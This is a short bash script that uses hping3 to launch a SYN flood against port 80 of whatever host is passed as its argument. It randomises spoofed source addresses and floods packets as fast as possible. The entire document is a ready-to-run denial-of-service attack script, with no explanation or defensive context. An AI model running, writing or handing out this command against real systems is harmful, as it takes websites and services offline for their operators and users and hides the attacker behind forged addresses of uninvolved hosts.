#!/bin/bash
hping3 --rand-source -S -p 80 --flood  "$1"
